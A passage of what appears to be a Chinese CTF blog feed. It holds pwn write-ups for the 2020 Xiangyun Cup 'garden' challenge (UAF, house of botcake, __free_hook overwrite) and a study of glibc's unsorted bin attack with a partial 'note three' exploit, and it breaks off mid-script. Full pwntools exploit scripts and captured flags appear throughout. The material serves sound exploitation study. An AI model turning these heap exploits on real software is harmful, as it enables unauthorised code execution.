add(0x8f)</span>init()show()ru(<span class="hljs-string">'ow:\n'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)add(<span class="hljs-number">0x80</span>)set(p64(<span class="hljs-number">0x3c67a8</span> +libc_base) + p64(<span class="hljs-number">0x3c67a8</span> + libc_base))set(p64(rce16[<span class="hljs-number">3</span>] + libc_base)*<span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>)create()<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/9UJXcK.png" srcset="/img/loading.gif" alt><br>flag{807591828e94ceb0e6c206caa5f98927}</p><h2 id="garden"><a href="#garden" class="headerlink" title="garden"></a>garden</h2><h3 id="漏洞点-4"><a href="#漏洞点-4" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>steal tree函数存在uaf</li></ul><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>研究程序逻辑后，发现基本就是<code>house_ of_ botcake</code>的进阶利用版。</p><p>所以核心思路就是 <code>house of botcake</code>，但是由于没有能够申请更大的chunk来利用，所以需要用进tcache的chunk来做padding chunk，然后用name那个函数的malloc 0x20，切割一下生成的unsortedbin。</p><p>接着就简单了，也就是释放完heap无用残余指针，然后多次申请，和适当的free堆，来改unsortbin上重叠tcache的堆头，来实现tcache attack，接着打free hook。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'8.131.69.237'</span>,<span class="hljs-number">32452</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex?'</span>,str(idx))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-comment">#  only one</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex?\n'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">steal</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'5'</span>)    sla(<span class="hljs-string">'tree'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">name</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'6'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    add(i,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">7</span>,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">8</span>,<span class="hljs-string">'chumen77'</span>)<span class="hljs-comment"># name()</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):    free(i)free(<span class="hljs-number">8</span>)free(<span class="hljs-number">5</span>)steal(<span class="hljs-number">7</span>)free(<span class="hljs-number">6</span>)show(<span class="hljs-number">7</span>)<span class="hljs-comment"># r()</span><span class="hljs-comment">#  p/x 0x00007fd1efd50ca0 - 0x00007fd1efb6c000</span>libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x1e4ca0</span>info_addr(<span class="hljs-string">'libc'</span>,libcbase)add(<span class="hljs-number">0</span>,<span class="hljs-string">'chumen77'</span>)free(<span class="hljs-number">7</span>)name()free(<span class="hljs-number">0</span>)<span class="hljs-comment"># debug()</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    add(i,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">7</span>,<span class="hljs-string">'chumen77'</span>)<span class="hljs-comment"># free(0)</span>add(<span class="hljs-number">8</span>,<span class="hljs-string">'chumen77'</span>)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">8</span>)__malloc_hook = <span class="hljs-number">0x1e4c30</span>__free_hook = <span class="hljs-number">0x1e75a8</span>one = p64(<span class="hljs-number">0x52fd0</span>+libcbase)payload = <span class="hljs-number">0xd0</span> * <span class="hljs-string">'\x00'</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x111</span>) + p64(<span class="hljs-number">0x1e75a8</span> + libcbase)add(<span class="hljs-number">8</span>,payload)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(<span class="hljs-number">7</span>-i+<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">6</span>):    add(i,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">7</span>,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">8</span>,one)add(<span class="hljs-number">6</span>,<span class="hljs-string">'/bin/sh\x00'</span>)free(<span class="hljs-number">6</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/wNb41v.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">flag&#123;<span class="hljs-number">49333188</span>b93b530dfaf568d0816aa0fa&#125;</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;祥云杯2020CTF部分pwn-wp&quot;&gt;&lt;a href=&quot;#祥云杯2020CTF部分pwn-wp&quot; class=&quot;headerlink&quot; title=&quot;祥云杯2020CTF部分pwn wp&quot;&gt;&lt;/a&gt;祥云杯2020CTF部分pwn wp&lt;/h1&gt;&lt;h2 id=&quot;￼
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="wp" scheme="http://chumen77.xyz/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Unsorted\_Bin\_Attack再学习</title>
    <link href="http://chumen77.xyz/2020/11/18/Unsorted_Bin_Attack%E5%86%8D%E5%AD%A6%E4%B9%A0/"/>
    <id>http://chumen77.xyz/2020/11/18/Unsorted_Bin_Attack再学习/</id>
    <published>2020-11-18T01:19:14.929Z</published>
    <updated>2020-11-30T16:15:10.428Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Unsorted-Bin-Attack-再学习"><a href="#Unsorted-Bin-Attack-再学习" class="headerlink" title="Unsorted_Bin_Attack  再学习"></a><code>Unsorted_Bin_Attack</code>  再学习</h1><p>感觉自己对<code>Unsorted_Bin_Attack</code>掌握的不是很好，最初学习时，也没有对着源码进行学习分析。决定再总结和学习一下。</p><h2 id="基本来源和知识"><a href="#基本来源和知识" class="headerlink" title="基本来源和知识"></a>基本来源和知识</h2><h3 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h3><ul><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li><li>当进行 <code>malloc_consolidate</code>时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 紧邻的话。</li></ul><h3 id="使用时的情况"><a href="#使用时的情况" class="headerlink" title="使用时的情况"></a>使用时的情况</h3><ul><li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取。</li><li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li><li>unsorted bin遍历堆块的时候使用的是bk指针</li></ul><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/*     Process recently freed or remaindered chunks, taking one only if     it is exact fit, or, if this a small request, the chunk is remainder from     the most recent non-exact fit.  Place other traversed chunks in     bins.  Note that this step is the only place in any routine where     chunks are placed in bins. 进程最近释放的或剩余的chunks，仅在完全匹配的情况下才取走，或者，如果请求的字节很小，  则会选择最近一次非完全匹配的剩余chunk。将其他遍历的chunk分别插入到对应的 bin 中。  请注意，在任何例程中，此步骤是惟一一个将 chunk 放入对应的 bin 中的位置的步骤。     The outer loop here is needed because we might not realize until     near the end of malloc that we should have consolidated, so must     do so and retry. This happens at most once, and only when we would     otherwise need to expand memory to service a "small" request. 这里需要外部循环的因为是：  我们可能直到接近malloc函数的末尾才可能意识到应该进行chunk合并，  所以我们必须反复尝试。这种情况最多只发生一次，并且只有当我们想这样做时才会发生，  否则，需要扩展内存来处理“小”请求。（分割top chunk之类的）   */</span>  <span class="hljs-keyword">for</span> (;; )    &#123;      <span class="hljs-keyword">int</span> iters = <span class="hljs-number">0</span>;      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="hljs-comment">//从unsortbin第一个chunk（队尾）开始顺着bk指针向前遍历,其进行简单的判断，倘若不相等，证明unsortedbin中还存在chunk，则进入unsortedbin相关处理的循环。</span>        &#123;          bck = victim-&gt;bk; <span class="hljs-comment">//bck是倒数第二个，victim是倒数第一个</span>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))            malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,                             chunk2mem (victim), av); <span class="hljs-comment">//victim的size位进行检查，这个约束比较宽松，计算得到chunk实际大小</span>          size = chunksize (victim);  <span class="hljs-comment">////取出victim的size</span></code></pre></div><p>接着是常遇到的情况，但是在unsortedbin attack中，bck被修改，这块代码并不会被执行：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/*             If a small request, try to use last remainder if it is the             only chunk in unsorted bin.  This helps promote locality for             runs of consecutive small requests. This is the only             exception to best-fit, and applies only when there is             no exact fit for a small chunk.  如果申请一个小的size，并且unsorted bin仅剩最后一个chunk时，会尝试使用该chunk        这有助于为连续的申请小size的行为提升局部性。这是best-fit的唯一例外，        并且只适用于没有对一个小size申请的情况。           */</span><span class="hljs-comment">/*假如我们申请的chunk属于small bin的范围，且last remainder是unsorted bin的唯一一个chunk时，  我们优先使用这个块，如果该块满足条件则对其进行切割和解链操作。*/</span>  <span class="hljs-comment">/* 显然，bck被修改，并不符合这里的要求，不会进入其中的代码*/</span>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;              bck == unsorted_chunks (av) &amp;&amp;              victim == av-&gt;last_remainder &amp;&amp;              (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE))            &#123;              <span class="hljs-comment">/* split and reattach remainder   分割或者将剩余的chunk合并 */</span>              remainder_size = size - nb;              remainder = chunk_at_offset (victim, nb);              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;              av-&gt;last_remainder = remainder;              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))                &#123;                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;                &#125;              set_head (victim, nb | PREV_INUSE |                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));              set_head (remainder, remainder_size | PREV_INUSE);              set_foot (remainder, remainder_size);              check_malloced_chunk (av, victim, nb);              <span class="hljs-keyword">void</span> *p = chunk2mem (victim);              alloc_perturb (p, bytes);              <span class="hljs-keyword">return</span> p;            &#125;</code></pre></div><p>接着到了unsortedbin attack的关键处：</p><div class="hljs"><pre><code class="hljs c">          unsorted_chunks (av)-&gt;bk = bck;          bck-&gt;fd = unsorted_chunks (av);<span class="hljs-comment">//unsorted_chunks (av)这里就是victim即最后一个chunk，当我们可以控制victim的bk指针时（即bck）</span>      <span class="hljs-comment">//就可以往bck-&gt;fd写入unsorted_chunks(av)即*(bck+0x10)=unsorted(av)</span>      <span class="hljs-comment">//要求bck是一个可写的地址，否则会crush</span></code></pre></div><p>其也就是<code>*(bck+0x10)=unsorted(av)</code>，倘若篡改bk指针为<code>目标地址-0x10</code>，利用这里可以往目标处写入一个巨大的值。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/FQa72u.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">（抄ScUpax0s师傅的图）</code></pre></div><p>代码继续走，下面一个代码块是指如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (size == nb)           &#123;             set_inuse_bit_at_offset (victim, size);             <span class="hljs-keyword">if</span> (av != &amp;main_arena)               victim-&gt;size |= NON_MAIN_ARENA;             check_malloced_chunk (av, victim, nb);             <span class="hljs-keyword">void</span> *p = chunk2mem (victim);             alloc_perturb (p, bytes);             <span class="hljs-keyword">return</span> p;           &#125;</code></pre></div><p>然后，如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，需要根据其size放入small bin或large bin的链。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>触发时的申请的size要和free掉的size一样，否则将unsorted bin中的chunk放回对应的bin后，unsort bin的连续性会被破坏，也就过不了下面的check。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))          malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,</code></pre></div><p>当原来申请chunk时，size刚好于unsortedbin相同：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (size == nb)  &#123;    set_inuse_bit_at_offset (victim, size);    <span class="hljs-keyword">if</span> (av != &amp;main_arena)      victim-&gt;size |= NON_MAIN_ARENA;    check_malloced_chunk (av, victim, nb);    <span class="hljs-keyword">void</span> *p = chunk2mem (victim);    alloc_perturb (p, bytes);    <span class="hljs-keyword">return</span> p;  &#125;</code></pre></div><p>首先设置当前chunk 处于 inuse 状态，该标志位处于相邻的下一个 chunk 的 size 字段中。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse_bit_at_offset(p, s)      \  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span></code></pre></div><p>最后调用 chunk2mem()获得 chunk 中可用的内存指针，返回给应用层，退出。 就不会出现上面的错误。</p><h2 id="黄鹤杯-note-three"><a href="#黄鹤杯-note-three" class="headerlink" title="黄鹤杯 note three"></a>黄鹤杯 note three</h2><p>基本国赛原题，no free，所以此处就只记录用unsortedbin attack打。</p><h3 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h3><p>存在堆溢出，没有free show功能，先可以用HOF 改掉top size，借助多次分配让其进入unsortedbin，然后进行unsortedbin attack。</p><h3 id="难点细节"><a href="#难点细节" class="headerlink" title="难点细节"></a>难点细节</h3><h4 id="难点1"><a href="#难点1" class="headerlink" title="难点1"></a>难点1</h4><p>HOF改size后，多次申请让top chunk 进unsorted bin。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (old_size != <span class="hljs-number">0</span>)  &#123;    <span class="hljs-comment">/*       Shrink old_top to insert fenceposts, keeping size a       multiple of MALLOC_ALIGNMENT. We know there is at least       enough space in old_top to do this.     */</span>    old_size = (old_size - <span class="hljs-number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK; <span class="hljs-comment">//top chunk's old size -0x20</span>    set_head (old_top, old_size | PREV_INUSE);<span class="hljs-comment">/*   Note that the following assignments completely overwrite   old_top when old_size was previously MINSIZE.  This is   intentional. We need the fencepost, even if old_top otherwise gets   lost. */</span>    chunk_at_offset (old_top, old_size)-&gt;size =    (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE;    chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ)-&gt;size =    (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE;  <span class="hljs-comment">/* If possible, release the rest. */</span>      <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)        &#123;            _int_free (av, old_top, <span class="hljs-number">1</span>); <span class="hljs-comment">//old_size =top chunk size - 0x20</span>        &#125;    &#125;</code></pre></div><p>首先申请一个chunk，倘若top chunk 的size减去这个chunk的size &gt;=MINSIZE，其就正常的切割。<br>否则，其会告诉系统top chunk已经不够用了，需要申请一个新的内存页。<br>对于旧的top chunk的处理，会进入如上流程，可以看到在旧的top chunk  size在 减去0x20后，倘若其是大于0x20的，就会被放入bin中。</p><p>倘若起大于0x80，就会被放入unsorted bin，也是为接下来攻击做准备。</p><h4 id="难点2"><a href="#难点2" class="headerlink" title="难点2"></a>难点2</h4><p>Unsortedbin attack如前面所示，也就可以实现往一个地址写上一个main arenas的地址，仅使用这个地址是怎么能完成拿shell的攻击的。先看下其写入的地址信息：</p><div class="hljs"><pre><code class="hljs c">gef➤  x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x00007f99bb194b78</span><span class="hljs-number">0x7f99bb194b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;: <span class="hljs-number">0x0000000000602030</span>      <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x7f99bb194b88</span> &lt;main_arena+<span class="hljs-number">104</span>&gt;:        <span class="hljs-number">0x0000000001cccf50</span>      <span class="hljs-number">0x00000000006021b0</span><span class="hljs-number">0x7f99bb194b98</span> &lt;main_arena+<span class="hljs-number">120</span>&gt;:        <span class="hljs-number">0x00007f99bb194b88</span>      <span class="hljs-number">0x00007f99bb194b88</span><span class="hljs-number">0x7f99bb194ba8</span> &lt;main_arena+<span class="hljs-number">136</span>&gt;:        <span class="hljs-number">0x00007f99bb194b98</span>      <span class="hljs-number">0x00007f99bb194b98</span><span class="hljs-number">0x7f99bb194bb8</span> &lt;main_arena+<span class="hljs-number">152</span>&gt;:        <span class="hljs-number">0x00007f99bb194ba8</span>      <span class="hljs-number">0x00007f99bb194ba8</span><span class="hljs-number">0x7f99bb194bc8</span> &lt;main_arena+<span class="hljs-number">168</span>&gt;:        <span class="hljs-number">0x00007f99bb194bb8</span>      <span class="hljs-number">0x00007f99bb194bb8</span></code></pre></div><p>会发现其写入的是<code>main_arena+88</code>，这紧邻着就是<code>top chunk last_remainder unsortedbin&#39;s fd bk</code></p><p>事情就变得有意思起来，这块top chunk已经废了（并没有办法将其设置为合适的值来进行利用），<code>last_remainder</code>用途不是很大，<strong>unsortedbin’s fd 和bk 设置好的话，可以伪造出一个unsorted bin，接着再申请相同大小的chunk，即可拿到这个伪造的unsorted bin</strong>。</p><p>其中需要注意的是仍需要绕过unsortbin 一些检查，其中很重要的检查就是保证fake unsorted bin的bck<strong>需要是一个可写的地址</strong>。这点也很容易做到，我们的输入首先会放在bss上，完全可以通过输入来伪造<code>fake_ unsorted bin</code>及其bk对应的堆块。</p><p>所以，先利用unsortbin attack往heaplist上打上<code>main_arena+88</code>，然后edit来控制<code>main_arena+88</code>附近的内存，伪造出一个unsorted bin，其指向heaplist 附近，目标也就是控制到heaplist。</p><p>然后在申请chunk时，用往bss段写的数据，来通过相关检查，接着获得一个在heaplist附近的chunk。利用这样的unsortbin attack来完成攻击。</p><p>剩下的就好说了，可以看exp。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./note_three'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,content)</span>:</span>    io.recvuntil(<span class="hljs-string">'choice&gt;&gt; '</span>)    io.sendline(<span class="hljs-string">'1'</span>)    io.recvuntil(<span class="hljs-string">"idx: "</span>)    io.sendline(str(idx))    io.recvuntil(<span class="hljs-string">"size: "</span>)    io.sendline(str(size))    io.recvuntil(<span class="hljs-string">"content: "</span>)    io.send(str(content))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span>    io.recvuntil(<span class="hljs-string">'choice&gt;&gt; '</span>)    io.sendline(<span class="hljs-string">'2'</span>)    io.recvuntil(<span class="hljs-string">"idx: "</span>)    io.sendline(str(idx))    io.recvuntil(<span class="hljs-string">"content: "</span>)    io.send(str(content))add(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x18</span>)edit(<span class="hljs-number">0</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0xfd1</span>))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x17</span>):    add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x90</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x70</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x30</span>) <span class="hljs-comment">#切割用，切割后 top chunk 0xb1</span>debug()add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x90</span>)debug()payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0x91</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x6021b0</span>)edit(<span class="hljs-number">2</span>,payload)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#申请和进入unsortedbin大小一样的chunk</span><span class="hljs-comment"># add(1,0x90,'1'*0x81)</span>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x6020c0</span>+<span class="hljs-number">0x70</span>)*<span class="hljs-number">2</span>) <span class="hljs-comment">#伪造main_arena+88 其中top chunk的地址并不重要，写0即可，重要是伪造unsortedbin</span>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x78</span> +p64(<span class="hljs-number">0x91</span>)+p64(<span class="hljs-number">0x6021b0</span>)*<span class="hljs-number">2</span>)debug()<span class="hljs-comment">#攻击heaplist 实现任意地址写</span>payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x6021c0</span>)edit(<span class="hljs-number">2</span>,payload)edit(<span class="hljs-number">0</span>,p64(elf.got[<span class="hljs-string">'atoi'</span>]) + p64(<span class="hljs-number">0x90</span>) + p64(elf.got[<span class="hljs-string">'atoi'</span>])+p64(<span class="hljs-number">0x90</span>) + p64(elf.got[<span class="hljs-string">'atoi'</span>]))edit(<span class="hljs-number">0</span>,p64(elf.plt[<span class="hljs-string">'printf'</span>]))sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)payload = <span class="hljs-string">'aaaa%7$s'</span> + p64(<span class="hljs-number">0x000000000602018</span>)sa(<span class="hljs-string">'idx'</span>,payload)r(<span class="hljs-number">4</span>)r(<span class="hljs-number">4</span>)libc_base = uu64(r(<span 